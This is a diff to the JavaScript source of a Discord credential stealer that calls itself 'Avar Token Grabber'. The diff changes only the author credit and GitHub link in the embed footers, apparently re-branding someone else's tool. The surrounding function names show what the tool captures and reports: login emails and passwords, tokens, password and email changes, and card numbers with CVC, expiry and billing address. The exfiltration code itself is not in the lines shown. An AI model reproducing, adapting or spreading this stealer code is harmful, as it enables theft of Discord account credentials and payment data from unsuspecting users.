@@ -167,7 +167,7 @@ function Login(email, password, token) {
                         "icon_url": `https://cdn.discordapp.com/avatars/${json.id}/${json.avatar}.webp`
                     },
                     "footer": {
-                        "text": "Avar Grabber By Cl1cker https://github.com/Cl1ckerr/Avar-Token-Grabber"
+                        "text": "Avar Grabber By Sarah https://github.com/Sarahh731/Avar-Token-Grabber"
                     }
                 }
             ]
@@ -220,7 +220,7 @@ function ChangePassword(oldpassword, newpassword, token) {
                             "icon_url": `https://cdn.discordapp.com/avatars/${json.id}/${json.avatar}.webp`
                         },
                         "footer": {
-                            "text": "Avar Grabber By Cl1cker https://github.com/Cl1ckerr/Avar-Token-Grabber"
+                            "text": "Avar Grabber By Sarah https://github.com/Sarahh731/Avar-Token-Grabber"
                         }                 
                     }
                 ]
@@ -273,7 +273,7 @@ function ChangeEmail(newemail, password, token) {
                             "icon_url": `https://cdn.discordapp.com/avatars/${json.id}/${json.avatar}.webp`
                         },
                         "footer": {
-                            "text": "Avar Grabber By Cl1cker https://github.com/Cl1ckerr/Avar-Token-Grabber"
+                            "text": "Avar Grabber By Sarah https://github.com/Sarahh731/Avar-Token-Grabber"
                         }                
                     }
                 ]
@@ -327,7 +327,7 @@ function CreditCardAdded(number, cvc, expir_month, expir_year, street, city, sta
                             "icon_url": `https://cdn.discordapp.com/avatars/${json.id}/${json.avatar}.webp`
                         },
                         "footer": {
-                            "text": "Avar Grabber By Cl1cker https://github.com/Cl1ckerr/Avar-Token-Grabber"
+                            "text": "Avar Grabber By Sarah https://github.com/Sarahh731/Avar-Token-Grabber"
                         }
                     }
                 ]
@@ -380,7 +380,7 @@ function CreditCardAdded(number, cvc, expir_month, expir_year, street, city, sta
                             "icon_url": `https://cdn.discordapp.com/avatars/${json.id}/${json.avatar}.webp`
                         },
                         "footer": {
-                            "text": "Avar Grabber By Cl1cker https://github.com/Cl1ckerr/Avar-Token-Grabber"
+                            "text": "Avar Grabber By Sarah https://github.com/Sarahh731/Avar-Token-Grabber"
                         }
                     }
                 ]
